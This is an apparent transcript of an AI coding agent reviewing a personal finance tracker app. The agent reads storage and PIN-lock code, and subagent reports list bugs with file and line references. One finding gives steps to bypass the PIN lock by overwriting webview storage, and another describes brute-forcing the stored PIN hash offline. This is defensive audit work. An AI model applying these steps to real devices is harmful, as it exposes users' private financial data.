E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-mdpi\ic_laun...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-xhdpi\ic_lau...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-xhdpi\ic_lau...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-xhdpi\ic_lau...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-xhdpi\ic_lau...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-xxhdpi\ic_la...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-xxhdpi\ic_la...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-xxhdpi\ic_la...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-xxhdpi\ic_la...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-xxxhdpi\ic_l...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-xxxhdpi\ic_l...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-xxxhdpi\ic_l...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\mipmap-xxxhdpi\ic_l...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\values\colors.xml     
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\values\ic_launcher_...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\values\strings.xml    
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\values\styles.xml     
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\main\res\xml\file_paths.xml    
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\app\src\test\java\com\getcapacitor\m...
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\gradle\wrapper\gradle-wrapper.jar      
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\android\gradle\wrapper\gradle-wrapper.proper...


---public---

FullName                                                                                           
--------                                                                                           
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\public\logo.png            
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\public\manifest.webmanifest
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\public\icons\icon-192.png  
E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\public\icons\icon-512.png  



```

---

## Assistant (Build · DeepSeek V4 Flash Free (New) · 5.8s)

_Thinking:_

The android folder has 117k LOC mostly because of gradle caches / wrapper and build outputs (baselineProfiles, build directories). Let me check the actual source android files and look for the important ones (AndroidManifest, build.gradle, MainActivity).

Let me now dispatch parallel agents to review code, and I'll personally read the security-critical files. Let me dispatch 4 explore/general agents:

1. Utils review agent (financial logic correctness) - report bugs with file:line
2. Pages review agent (UI/state/validation)
3. Components+hooks+i18n review agent
4. Security & storage agent

And I'll personally read security files, configs, android.

Given context limits, let me dispatch agents with precise scope. Each agent will do research only and report findings. I'll instruct them to verify against source and provide exact file:line references.

Let me launch them.

The android folder LOC is mostly generated build outputs. Let me read the security-critical files myself while dispatching parallel review agents for the bulk of the code.

**Tool: read**

**Input:**
```json
{
  "filePath": "E:\\Siva Current Work Backup File\\shyblack\\shyBlackMoneyTracker\\shyblack\\src\\utils\\safeStorage.js"
}
```

**Output:**
```
<path>E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\safeStorage.js</path>
<type>file</type>
<content>
1: import { getStorageAdapter, ADAPTER_TYPES } from './storageAdapter'
2: 
3: export const STORAGE_PREFIX = 'shyblack_'
4: 
5: export const STORAGE_KEYS = {
6:   TRANSACTIONS: `${STORAGE_PREFIX}transactions`,
7:   SAVINGS: `${STORAGE_PREFIX}savings`,
8:   BUDGETS: `${STORAGE_PREFIX}budgets`,
9:   RECURRING: `${STORAGE_PREFIX}recurring`,
10:   TAGS: `${STORAGE_PREFIX}tags`,
11:   SETTINGS: `${STORAGE_PREFIX}settings`,
12:   DEBTS: `${STORAGE_PREFIX}debts`,
13:   SCHEMA: `${STORAGE_PREFIX}schema`,
14:   ONBOARDING: `${STORAGE_PREFIX}onboarding`,
15:   REMINDER: `${STORAGE_PREFIX}reminder`,
16:   BUDGET_NOTIF: `${STORAGE_PREFIX}budget_notif`,
17:   STREAK: `${STORAGE_PREFIX}streak`,
18:   SNAPSHOT: `${STORAGE_PREFIX}snapshot`,
19:   GOALS: `${STORAGE_PREFIX}goals`,
20:   TEMPLATES: `${STORAGE_PREFIX}templates`,
21:   REVIEW: `${STORAGE_PREFIX}review`,
22:   NET_WORTH_ACCOUNTS: `${STORAGE_PREFIX}net_worth_accounts`,
23:   NET_WORTH_HISTORY: `${STORAGE_PREFIX}net_worth_history`,
24:   TRANSFERS: `${STORAGE_PREFIX}transfers`,
25:   EMIS: `${STORAGE_PREFIX}emis`,
26:   FORECAST_CONFIG: `${STORAGE_PREFIX}forecast_config`,
27:   ACHIEVEMENTS: `${STORAGE_PREFIX}achievements`,
28:   ARCHIVE: `${STORAGE_PREFIX}archive`,
29:   SEARCH_INDEX: `${STORAGE_PREFIX}search_idx`,
30:   DOCUMENTS: `${STORAGE_PREFIX}documents`,
31:   DOCUMENT_FILES: `${STORAGE_PREFIX}document_files`,
32:   RELATIONSHIPS: `${STORAGE_PREFIX}relationships`,
33:   EMI_TRACKER: `${STORAGE_PREFIX}emi_tracker`,
34:   BUDGETS_V2: `${STORAGE_PREFIX}budgets_v2`,
35:   RECEIPT_SCANS: `${STORAGE_PREFIX}receipt_scans`,
36:   WEALTH_ASSETS: `${STORAGE_PREFIX}wealth_assets`,
37:   BACKUPS: `${STORAGE_PREFIX}backups`,
38:   SCORE_HISTORY: `${STORAGE_PREFIX}score_history`,
39: }
40: 
41: const memoryCache = new Map()
42: 
43: function getAdapter() {
44:   return getStorageAdapter()
45: }
46: 
47: function invalidateCache(key) {
48:   memoryCache.delete(key)
49: }
50: 
51: export const safeStorage = {
52:   get(key, fallback = null) {
53:     if (memoryCache.has(key)) {
54:       const cached = memoryCache.get(key)
55:       // Treat null/undefined cache entries as cache misses so the adapter is
56:       // always consulted for falsy stored values (e.g. set(key, null)).
57:       if (cached !== null && cached !== undefined) return cached
58:     }
59:     try {
60:       const value = getAdapter().get(key, fallback)
61:       memoryCache.set(key, value)
62:       return value
63:     } catch {
64:       invalidateCache(key)
65:       return fallback
66:     }
67:   },
68: 
69:   getRaw(key) {
70:     try {
71:       return getAdapter().getRaw(key)
72:     } catch {
73:       return null
74:     }
75:   },
76: 
77:   set(key, value) {
78:     try {
79:       memoryCache.set(key, value)
80:       return getAdapter().set(key, value)
81:     } catch {
82:       return false
83:     }
84:   },
85: 
86:   remove(key) {
87:     try {
88:       invalidateCache(key)
89:       return getAdapter().remove(key)
90:     } catch {
91:       return false
92:     }
93:   },
94: 
95:   clear() {
96:     try {
97:       memoryCache.clear()
98:       return getAdapter().clear()
99:     } catch {
100:       return false
101:     }
102:   },
103: 
104:   getStorageInfo() {
105:     try {
106:       return getAdapter().getStorageInfo()
107:     } catch {
108:       return { usedBytes: 0, usedKB: 0, keyCount: 0 }
109:     }
110:   },
111: 
112:   isAvailable() {
113:     try {
114:       return getAdapter().isAvailable()
115:     } catch {
116:       return false
117:     }
118:   },
119: 
120:   getBatch(keys) {
121:     const results = {}
122:     for (const key of keys) {
123:       results[key] = this.get(key, null)
124:     }
125:     return results
126:   },
127: 
128:   setBatch(pairs) {
129:     const results = {}
130:     for (const { key, value } of pairs) {
131:       results[key] = this.set(key, value)
132:     }
133:     return results
134:   },
135: 
136:   invalidateCache(key) {
137:     if (key) {
138:       invalidateCache(key)
139:     } else {
140:       memoryCache.clear()
141:     }
142:   },
143: }

(End of file - total 143 lines)
</content>
```

**Tool: read**

**Input:**
```json
{
  "filePath": "E:\\Siva Current Work Backup File\\shyblack\\shyBlackMoneyTracker\\shyblack\\src\\utils\\privacy.js"
}
```

**Output:**
```
<path>E:\Siva Current Work Backup File\shyblack\shyBlackMoneyTracker\shyblack\src\utils\privacy.js</path>
<type>file</type>
<content>
1: import { safeStorage } from './safeStorage'
2: 
3: const PRIVACY_KEY = 'finora_privacy'
4: 
5: const FAIL_THRESHOLD_COOLDOWN = 5
6: const FAIL_THRESHOLD_LOCKOUT = 10
7: const COOLDOWN_MS = 30_000
8: 
9: let locked = false
10: let lastActiveTime = Date.now()
11: let suppressLock = false
12: let suppressLockTimer = null
13: 
14: function getData() {
15:   const raw = safeStorage.getRaw(PRIVACY_KEY)
16:   if (!raw) return {}
17:   try {
18:     const parsed = JSON.parse(raw)
19:     if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) {
20:       if (parsed.pinHash && (typeof parsed.pinHash !== 'string' || parsed.pinHash.length !== 64)) {
21:         // pinHash is present but malformed — could be storage corruption or tampering.
22:         // Do NOT clear the data: clearing would allow a bypass by writing a bad hash.
23:         // Instead force requiresReset so the lock screen demands a full data reset.
24:         return { ...parsed, requiresReset: true }
25:       }
26:       return parsed
27:     }
28:     // No recognisable object structure and no pinHash — safe to treat as unset.
29:     saveData({})
30:     return {}
31:   } catch {
32:     // Unparseable JSON with no detectable pinHash — safe to treat as unset.
33:     saveData({})
34:     return {}
35:   }
36: }
37: 
38: function saveData(data) {
39:   safeStorage.set(PRIVACY_KEY, data)
40: }
41: 
42: function generateSalt() {
43:   const bytes = new Uint8Array(16)
44:   crypto.getRandomValues(bytes)
45:   return Array.from(bytes).map((b) => b.toString(16).padStart(2, '0')).join('')
46: }
47: 
48: async function computeHash(pin, salt = '') {
49:   const encoder = new TextEncoder()
50:   const buffer = await crypto.subtle.digest('SHA-256', encoder.encode(salt + pin))
51:   return Array.from(new Uint8Array(buffer)).map((b) => b.toString(16).padStart(2, '0')).join('')
52: }
53: 
54: export function isPinSet() {
55:   const data = getData()
56:   // A corrupted pinHash (requiresReset forced by getData) counts as PIN being set —
57:   // the lock screen will require a data reset instead of accepting a PIN.
58:   if (data.requiresReset && data.pinHash) return true
59:   return !!(data.pinHash && typeof data.pinHash === 'string' && data.pinHash.length === 64)
60: }
61: 
62: export async function setPin(pin) {
63:   const salt = generateSalt()
64:   const hash = await computeHash(pin, salt)
65:   const data = getData()
66:   saveData({ ...data, pinHash: hash, pinSalt: salt, failCount: 0, cooldownUntil: null, requiresReset: false })
67: }
68: 
69: export async function verifyPin(pin) {
70:   const data = getData()
71:   if (!data.pinHash) return false
72: 
73:   if (data.requiresReset) return false
74: 
75:   if (data.cooldownUntil && Date.now() < data.cooldownUntil) return false
76: 
77:   let ok
78:   if (data.pinSalt) {
79:     ok = (await computeHash(pin, data.pinSalt)) === data.pinHash
80:   } else {
81:     ok = (await computeHash(pin, '')) === data.pinHash
82:     if (ok) {
83:       const salt = generateSalt()
84:       const newHash = await computeHash(pin, salt)
85:       saveData({ ...getData(), pinHash: newHash, pinSalt: salt, failCount: 0, cooldownUntil: null })
86:       return true
87:     }
88:   }
89: 
90:   if (ok) {
91:     saveData({ ...getData(), failCount: 0, cooldownUntil: null })
92:   } else {
93:     const current = getData()
94:     const failCount = (current.failCount || 0) + 1
95:     const updates = { failCount }
96:     if (failCount >= FAIL_THRESHOLD_LOCKOUT) {
97:       updates.requiresReset = true
98:     } else if (failCount >= FAIL_THRESHOLD_COOLDOWN) {
99:       updates.cooldownUntil = Date.now() + COOLDOWN_MS
100:     }
101:     saveData({ ...current, ...updates })
102:   }
103: 
104:   return ok
105: }
106: 
107: export function getFailState() {
108:   const data = getData()
109:   const now = Date.now()
110:   const cooldownUntil = data.cooldownUntil || null
111:   const cooldownRemaining = cooldownUntil && now < cooldownUntil ? Math.ceil((cooldownUntil - now) / 1000) : 0
112:   return {
113:     failCount: data.failCount || 0,
114:     cooldownRemaining,
115:     requiresReset: data.requiresReset || false,
116:   }
117: }
118: 
119: export function clearPin() {
120:   const data = getData()
121:   // eslint-disable-next-line no-unused-vars
122:   const { pinHash, pinSalt, failCount, cooldownUntil, requiresReset, ...rest } = data
123:   saveData(rest)
124:   locked = false
125: }
126: 
127: export function getTimeout() {
128:   return getData().timeout ?? 0
129: }
130: 
131: export function setTimeoutPref(seconds) {
132:   saveData({ ...getData(), timeout: seconds })
133: }
134: 
135: export function initLockState() {
136:   locked = isPinSet()
137: }
138: 
139: export function isLocked() {
140:   if (!isPinSet()) return false
141:   return locked
142: }
143: 
144: export function unlockSession() {
145:   locked = false
146:   lastActiveTime = Date.now()
147: }
148: 
149: export function onAppBackground() {
150:   lastActiveTime = Date.now()
151: }
152: 
153: export function suppressLockForTransition(timeoutMs = 5000) {
154:   suppressLock = true
155:   if (suppressLockTimer) clearTimeout(suppressLockTimer)
156:   suppressLockTimer = setTimeout(() => {
157:     suppressLock = false
158:     suppressLockTimer = null
159:   }, timeoutMs)
160: }
161: 
162: export function shouldLockOnResume() {
163:   if (!isPinSet()) return false
164:   // If lock is already active, never auto-dismiss it.
165:   // The lock can only be removed by explicit unlockSession() via PIN or biometric.
166:   // Check this BEFORE suppressLock to prevent bypass via stale suppress flag.
167:   if (locked) return true
168:   if (suppressLock) return false
169:   const timeout = getTimeout()
170:   const elapsed = Date.now() - lastActiveTime
171:   if (timeout === 0) {
172:     locked = true
173:     return true
174:   }
175:   if (elapsed >= timeout * 1000) {
176:     locked = true
177:     return true
178:   }
179:   return false
180: }

(End of file - total 180 lines)
</content>
```

---

## Assistant (Build · DeepSeek V4 Flash Free (New))

_Thinking:_

Good. Now let me dispatch the parallel agents. I'll launch 4 agents to review utils, pages, components/hooks/i18n, and config/android/build/tests. Each should be research-only and return findings with exact file:line references.

Meanwhile I'll continue reviewing security-critical files myself: storageAdapter.js, biometrics.js, security.js, backup.js, documents.js, PinLockScreen.jsx.

Let me launch the agents now.

Now let me dispatch parallel review agents for the bulk of the code while I review security-critical files myself.

**Tool: task**

**Input:**
```json
{
  "description": "Review utils financial logic",
  "prompt": "You are performing a production-grade code review (RESEARCH ONLY - do not modify files) of a financial expense-tracker app at \"E:\\Siva Current Work Backup File\\shyblack\\shyBlackMoneyTracker\\shyblack\\src\\utils\".\n\nReview these files ONLY (read each one completely):\ndebts.js, emi.js, budgets.js, budgetUtils.js, recurring.js, bills.js, goals.js, networth.js, wealthUtils.js, financialHealth.js, healthScore2.js, insights.js, insightsEngine.js, analytics.js, trends.js, cashFlowForecast.js, forecastEngine.js, financialCalendar.js, financialTimeline.js, timeline.js, tags.js, transfers.js, relationships.js, relationshipInsights.js, review.js, reviewCenter.js, reviewEngine.js, achievements.js, sipCalculator.js, currency.js, helpers.js, contacts.js, dataQuality.js, dataValidator.js, indexer.js, fullSearchIndex.js, categoryDrilldown.js, templates.js, archiveEngine.js, snapshotRecovery.js, dataIntegrity.js, integrityValidator.js, backupHealth.js, backupMetadata.js, storageHealth.js.\n\nFor EVERY file, look for:\n1. Incorrect financial calculations (wrong formula, off-by-one in date math, rounding issues, NaN/Infinity results, division by zero)\n2. Bugs (crash potential, null/undefined dereference, logic errors, race conditions, mutation of state/shared objects, incorrect array handling)\n3. Edge cases that break business logic\n4. Inconsistent behavior between duplicate/similar implementations (e.g. multiple getLedgerSummary-like functions, healthScore vs financialHealth)\n5. Dead code, unused exports, duplicate logic across files\n6. Performance issues (O(n^2) loops, repeated expensive computation, no caching)\n7. Missing validation / bad defaults\n\nBe ACCURATE and VERIFY each finding against the actual code. Do NOT fabricate issues. For each genuine bug, report EXACTLY this format:\n\nBUG: <short title>\nSEVERITY: P0|P1|P2|P3\nFILE: <path>:<line numbers>\nFUNCTION: <function name>\nDESCRIPTION: <what is wrong>\nROOT CAUSE: <why it happens>\nREPRO: <steps to reproduce logically>\nEXPECTED: <correct behavior>\nACTUAL: <current behavior>\nRISK: <data loss|incorrect calculation|crash|etc>\n\nOnly report issues you are confident about after reading the actual source. Read every file fully. Return ALL findings, do not stop early. Also note any file with zero issues as \"CLEAN\".",
  "subagent_type": "general"
}
```

**Output:**
```
<task id="ses_043e6ae1effeDsOlSzV751NLGp" state="completed">
<task_result>
The research-only review is complete. I haven't been asked to modify any files, so I'm stopping here.

If you'd like, I can next:
1. Fix the 5 P1 crash/data-loss bugs (`financialTimeline.js`, `insightsEngine.js`, `insights.js`, `backupHealth.js`, `timeline.js`)
2. Fix all findings (P1 + P2 + P3)
3. Something else

Which would you like?
</task_result>
</task>
```

**Tool: task**

**Input:**
```json
{
  "description": "Review pages UI logic",
  "prompt": "You are performing a production-grade code review (RESEARCH ONLY - do not modify files) of a financial expense-tracker app at \"E:\\Siva Current Work Backup File\\shyblack\\shyBlackMoneyTracker\\shyblack\\src\\pages\".\n\nReview these files ONLY (read each one completely):\nDashboard.jsx, AddTransaction.jsx, History.jsx, Analytics.jsx, Settings.jsx, InsightsPage.jsx, BudgetsPage.jsx, ReportsPage.jsx, DebtsPage.jsx, TimelinePage.jsx, DiagnosticsPage.jsx, GoalsPage.jsx, SubscriptionsPage.jsx, FinancialCalendarPage.jsx, EmiCenterPage.jsx, NetWorthPage.jsx, BudgetCenterPage.jsx, ReceiptCenterPage.jsx, FinancialHealthPage.jsx, StatementExportPage.jsx, TransferPage.jsx, CashFlowForecastPage.jsx, FinancialTimelinePage.jsx, AchievementsPage.jsx, SearchPage.jsx, CategoryDetail.jsx, DocumentVaultPage.jsx, StatementCenterPage.jsx, PersonCenterPage.jsx, AccountCenterPage.jsx, DataQualityPage.jsx, ReviewCenterPage.jsx, TrendsPage.jsx, RecurringTransactionsPage.jsx, WealthCenterPage.jsx, RecoveryCenterPage.jsx, HealthCenterPage.jsx, ForecastCenterPage.jsx, AppInfoPage.jsx, PrivacyCenter.jsx, BillsPage.jsx, SIPCalculatorPage.jsx, MonthlyReview.jsx, Onboarding.jsx.\n\nFor EVERY file look for:\n1. React bugs: stale closures, missing useEffect deps, infinite render loops, setState in render, mutating props/state directly, keys issues, conditional hook violations\n2. Form bugs: unvalidated input, number parsing issues (parseFloat/parseInt bugs, NaN, negative values), amount precision\n3. Missing/null-safe handling (accessing undefined properties, t.transactions.length on undefined, etc.)\n4. Accessibility issues: missing aria labels, buttons without text, no alt text, no focus management, color-only indicators\n5. Responsive/mobile issues: hardcoded widths, overflow, unsupported touch targets\n6. State management misuse: calling context actions during render, race conditions on async, unhandled promise rejections\n7. Business logic bugs in page-level calculations\n8. i18n: hardcoded user-facing strings instead of using t(), invalid key usage\n9. Security: dangerouslySetInnerHTML, eval, exposing data\n\nBe ACCURATE and VERIFY each finding against actual code. Do NOT fabricate. For each genuine bug, report EXACTLY:\n\nBUG: <short title>\nSEVERITY: P0|P1|P2|P3\nFILE: <path>:<line numbers>\nFUNCTION: <function name or component>\nDESCRIPTION: <what is wrong>\nROOT CAUSE: <why>\nREPRO: <how to trigger>\nEXPECTED: <correct behavior>\nACTUAL: <current behavior>\nRISK: <impact>\n\nRead every file fully. Do not stop early. Return ALL findings.",
  "subagent_type": "general"
}
```

**Tool: task**

**Input:**
```json
{
  "description": "Review components hooks i18n",
  "prompt": "You are performing a production-grade code review (RESEARCH ONLY - do not modify files) of a financial expense-tracker app at \"E:\\Siva Current Work Backup File\\shyblack\\shyBlackMoneyTracker\\shyblack\\src\".\n\nReview these files ONLY (read each one completely):\nsrc\\App.jsx\nsrc\\components\\AddDebtModal.jsx\nsrc\\components\\AndroidBackHandler.jsx\nsrc\\components\\AnimatedNumber.jsx\nsrc\\components\\BottomNav.jsx\nsrc\\components\\BrandHeader.jsx\nsrc\\components\\CategoryIcon.jsx\nsrc\\components\\ConfirmationModal.jsx\nsrc\\components\\DashboardEmiWidget.jsx\nsrc\\components\\DebtCard.jsx\nsrc\\components\\EmptyState.jsx\nsrc\\components\\ErrorBoundary.jsx\nsrc\\components\\FinancialScore.jsx\nsrc\\components\\GlassCard.jsx\nsrc\\components\\Modal.jsx\nsrc\\components\\NotificationBanner.jsx\nsrc\\components\\PageErrorBoundary.jsx\nsrc\\components\\PageHeader.jsx\nsrc\\components\\PinLockScreen.jsx\nsrc\\components\\QuickActionCenter.jsx\nsrc\\components\\QuickActions.jsx\nsrc\\components\\RelatedItemsPanel.jsx\nsrc\\components\\SavingsProgress.jsx\nsrc\\components\\ScrollRestoration.jsx\nsrc\\components\\SkeletonLoader.jsx\nsrc\\components\\StatCard.jsx\nsrc\\components\\SuccessAnimation.jsx\nsrc\\components\\Toast.jsx\nsrc\\components\\TransactionItem.jsx\nsrc\\hooks\\useAccessibility.js\nsrc\\hooks\\useFinance.js\nsrc\\i18n\\index.jsx\n\nFor EVERY file look for:\n1. React bugs: stale closures, missing useEffect deps, infinite loops, setState in render, direct mutation of props, unstable keys, conditional hooks\n2. Modal/focus bugs: focus stealing, focus trap issues, z-index/stacking, escape key handling\n3. Accessibility issues (this is a mobile web app used by low-vision users): missing aria, role, focus-visible, touch targets < 44px, contrast\n4. Toast/notification system bugs: timer leaks, overlapping toasts, unmounted setState\n5. Navigation/routing bugs in App.jsx: state-based router issues, history bugs, deep-link handling, back button behavior\n6. Error boundary issues: swallowing errors, not resetting on navigation\n7. Performance: unnecessary re-renders, missing memo, layout thrash, animated components causing repaints\n8. Security: pin lock bypass, storage of PIN insecurely, biometric check flaws\n9. i18n: hardcoded strings, missing keys, language switching bugs\n\nBe ACCURATE and VERIFY each finding against actual code. Do NOT fabricate. For each genuine bug, report EXACTLY:\n\nBUG: <short title>\nSEVERITY: P0|P1|P2|P3\nFILE: <path>:<line numbers>\nFUNCTION: <function name or component>\nDESCRIPTION: <what is wrong>\nROOT CAUSE: <why>\nREPRO: <how to trigger>\nEXPECTED: <correct behavior>\nACTUAL: <current behavior>\nRISK: <impact>\n\nRead every file fully. Do not stop early. Return ALL findings.",
  "subagent_type": "general"
}
```

**Output:**
```
<task id="ses_043e68687ffeqsFW0SOVVhPw2n" state="completed">
<task_result>
I've read all 32 files completely plus the supporting utils (privacy, biometrics, safeStorage, storageAdapter, notifications, reminders) needed to verify security and integration claims. Here is the full review.

---

# Code Review: shyBlack Money Tracker (src)

## P1 — Critical

### BUG 1: PIN lock bypass — malformed stored data silently clears the PIN
SEVERITY: P1
FILE: `src/components/PinLockScreen.jsx:22-31` (root cause `src/utils/privacy.js:14-36`)
FUNCTION: `getData()` / `PinLockScreen`
DESCRIPTION: If `finora_privacy` contains any valid JSON that is not a plain object (e.g. `null`, `"abc"`, `[]`, `42`), `privacy.getData()` falls into the `else` branch, **overwrites storage with `{}`** (`saveData({})`), and returns `{}`. `isPinSet()` then returns `false`, so `initLockState()` sets `locked = false` and the app opens fully unlocked.
ROOT CAUSE: The "unparseable/corrupt → treat as unset" path calls `saveData({})` even when a `pinHash` may exist, and it unconditionally returns `{}` without checking whether a PIN was previously configured. A non-object JSON value is indistinguishable from "never configured", so the PIN is silently wiped.
REPRO: 1) Set a PIN. 2) In the webview devtools/rooted device, overwrite `localStorage["finora_privacy"]` with the string `null` or `[]`. 3) Relaunch the app — the PIN lock screen no longer appears.
EXPECTED: Corrupt/non-object data should force `requiresReset = true` (as the malformed-hash path already does) rather than clearing the PIN; the app must never silently downgrade from locked → unlocked.
ACTUAL: The lock is dropped and `{}` is persisted, permanently removing the PIN.
RISK: Full privacy-lock bypass on any device where an attacker can manipulate webview storage. (Same threat model can read plaintext finance data, so treat as defense-in-depth, but it is still a real bypass of the primary lock mechanism.)

---

## P2 — Significant

### BUG 2: AnimatedNumber re-runs its rAF loop from a clean timeline on every displayed-value change
SEVERITY: P2
FILE: `src/components/AnimatedNumber.jsx:9-28`
FUNCTION: `AnimatedNumber`
DESCRIPTION: The effect depends on `[value, duration, display]`, but `display` is written by `setDisplay` inside the same effect. Every re-render where the rounded value changes tears down the running animation (`cancelAnimationFrame`), resets `startTime.current = null` and `startValue.current = display`, and restarts a fresh eased ramp from the *current* value.
ROOT CAUSE: The animated state is included in its own animation effect's dependency array; the timeline (`startTime`) is reset each time instead of once per `value`/`duration` change.
REPRO: Render `<AnimatedNumber value={100} />`. The nominal `duration=600ms` is not honored — convergence is geometric (≈7.8% of the remaining distance per step after each reset), producing a choppy, much longer animation with 1+ extra render per displayed step.
EXPECTED: One rAF loop per `value` change, driven by `value`/`duration` only (display state not an effect dep).
ACTUAL: Animation restarts mid-flight; easing is distorted and duration is not respected.
RISK: Janky numbers on a financial dashboard; unnecessary re-renders and repaints on every animated figure (perf/reduced-motion concern for low-vision users).

### BUG 3: Nested modals leak the body scroll lock
SEVERITY: P2
FILE: `src/components/Modal.jsx:13-57` and `src/components/ConfirmationModal.jsx:44-67`
FUNCTION: `Modal` / `ConfirmationModal`
DESCRIPTION: Both components independently set `document.body.style.overflow = 'hidden'` on open and `''` on close/unmount with no reference counting. When a second modal (e.g. a ConfirmationModal) opens over a first modal, closing the top modal resets `overflow=''` while the bottom modal is still open — the background becomes scrollable again behind an open modal.
ROOT CAUSE: Each modal mutates a shared global (`body.style.overflow`) without tracking how many layers are active.
REPRO: Open `Modal` A, then open `ConfirmationModal` B over it; close B. Body scroll is restored even though A is still open.
EXPECTED: A scroll lock stack (lock/unlock balanced) so scroll stays locked until the last modal closes.
ACTUAL: Background scrolls behind the remaining open modal; focus-visible/scroll position for low-vision users is disrupted.
RISK: Focus/scroll confusion for assistive-tech users; background interaction appears unlocked.

### BUG 4: RelatedItemsPanel UI goes stale after link/unlink
SEVERITY: P2
FILE: `src/components/RelatedItemsPanel.jsx:34-43, 50-64`
FUNCTION: `RelatedItemsPanel`
DESCRIPTION: `related` is `useMemo(..., [entityType, entityId])`. `handleLink`/`handleUnlink` mutate the relationships store via non-reactive utils and call `setShowLinker(false)`/`setLinkTargetId('')`, but nothing changes `entityType`/`entityId`, so `related` never recomputes. The new relationship (or removed one) is not reflected in the list until the parent remounts the panel or the page is revisited.
ROOT CAUSE: Mutating shared storage through an imperative util while the memoized derived state is keyed only on props, with no refresh/recomputation trigger after mutation.
REPRO: Open a page with the panel, click "Link", pick a target, submit → the list doesn't show the new item. Unlink → item remains visible.
EXPECTED: Panel refreshes immediately after create/delete.
ACTUAL: Stale list; user sees incorrect link state (may re-link duplicates).
RISK: Incorrect financial-entity relationships shown to users.

### BUG 5: Edit/delete/unlink actions are invisible on touch devices
SEVERITY: P2
FILE: `src/components/TransactionItem.jsx:84-104` and `src/components/RelatedItemsPanel.jsx:159-165`
FUNCTION: `TransactionItem` / `RelatedItemsPanel`
DESCRIPTION: Action buttons are gated by `opacity-0 group-hover:opacity-100` (TransactionItem adds `focus-within:opacity-100`). On touch devices there is no hover, so the only way to reveal them is keyboard focus — touch users cannot see or discover edit/delete/unlink. RelatedItemsPanel's unlink button (`opacity-0 group-hover:opacity-100`) has the same problem and no `focus-within` fallback.
ROOT CAUSE: Desktop-hover-only reveal pattern in a mobile-first app.
REPRO: Open the app on a phone, tap a transaction — the edit/delete buttons never appear.
EXPECTED: Actions always visible (or revealed by touch/focus) on a mobile web app.
ACTUAL: Core actions (edit/delete a financial transaction, unlink an entity) are undiscoverable by the primary input modality.
RISK: Users cannot correct/delete erroneous transactions — data-integrity and accessibility failure for the target audience.

### BUG 6: ErrorBoundary "Reset local data" leaves the PIN lock (and lockout state) intact
SEVERITY: P2
FILE: `src/components/ErrorBoundary.jsx:41-59` (interacts with `src/utils/privacy.js:3,119-125` and `src/utils/biometrics.js:3`)
FUNCTION: `handleResetData`
DESCRIPTION: The reset only removes keys prefixed `shyblack_`. PIN data lives under `finora_privacy` and biometric settings under `finora_biometric` (no `shyblack_` prefix), so they survive. After `window.location.reload()`, `initLockState()` sets `locked = isPinSet() = true` — a user who just "reset all data" from the crash screen lands back on the lock screen. If `requiresReset` (10 failed attempts) was set, they cannot unlock with the PIN at all and are forced through another full reset inside the lock screen.
ROOT CAUSE: Two different key-naming schemes (`shyblack_` vs `finora_`) and no PIN reset in the crash-screen reset path (the lock-screen reset path does call `privacy.clearPin()`, showing the inconsistency).
REPRO: Set a PIN, force a top-level crash, tap "Reset local data" → after reload the app is locked again (or permanently requires a lock-screen reset).
EXPECTED: "Reset local data" produces a clean, unlocked first-run app (or intentionally keeps the PIN — but then it must be consistent and documented).
ACTUAL: Reset leaves stale lock/biometric/cooldown state; confusing lockout after a reset.
RISK: User can be stranded behind the lock screen after a data reset (support/bug for low-vision users); inconsistent with the lock-screen reset flow.

### BUG 7: PIN hashing uses unsalted-then-salted SHA-256 without key stretching; 4-digit PIN trivially brute-forceable
SEVERITY: P2
FILE: `src/components/PinLockScreen.jsx:99-123` (root cause `src/utils/privacy.js:42-52`)
FUNCTION: `verifyPin` / `computeHash`
DESCRIPTION: The stored secret is `SHA-256(salt + pin)` — a single fast hash with no PBKDF2/scrypt/argon2 iteration. With 4 digits (≤10,000 candidates), an attacker who obtains `pinHash`+`pinSalt` from localStorage can brute-force the PIN in milliseconds.
ROOT CAUSE: Choice of raw SHA-256 for a low-entropy secret.
REPRO: Read `finora_privacy` from webview storage; hash all 0000–9999 candidates with the stored salt; instant match.
EXPECTED: Iterative KDF (e.g. PBKDF2 with ≥100k iterations) or an OS-backed keystore for the PIN.
ACTUAL: PIN entropy effectively defeated by fast hashing; fail-lockout can be bypassed offline.
